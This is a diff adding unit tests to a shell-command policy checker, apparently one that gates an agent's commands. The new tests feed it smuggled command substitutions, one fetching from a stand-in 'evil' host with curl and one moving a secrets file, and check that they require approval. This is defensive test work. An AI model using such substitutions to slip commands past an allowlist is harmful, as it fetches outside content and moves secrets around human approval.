@@ -188,6 +188,24 @@ describe('shell-command-policy', () => {
       expect(evaluateShellCommandPolicy('cat a >> b').verdict).toBe('require_approval');
     });
 
+    it('NEW-1: command substitution never rides an allowlisted head', () => {
+      expect(evaluateShellCommandPolicy('cat $(curl -sL http://evil/x)').verdict).toBe(
+        'require_approval'
+      );
+      expect(evaluateShellCommandPolicy('cat `curl -sL http://evil/x`').verdict).toBe(
+        'require_approval'
+      );
+      expect(evaluateShellCommandPolicy('git status $(mv secrets /tmp)').verdict).toBe(
+        'require_approval'
+      );
+    });
+
+    it('NEW-2/3: read-write <> blocks allow while pure fd-duplication does not', () => {
+      expect(evaluateShellCommandPolicy('ls <> file').verdict).toBe('require_approval');
+      expect(evaluateShellCommandPolicy('ls -la 2>&1').verdict).toBe('allow');
+      expect(evaluateShellCommandPolicy('grep -rn x . 2>&1 | wc -l').verdict).toBe('allow');
+    });
+
     it('oversized commands are unscannable and require approval', () => {
       const decision = evaluateShellCommandPolicy(`ls ${'x'.repeat(70_000)}`);
       expect(decision.verdict).toBe('require_approval');
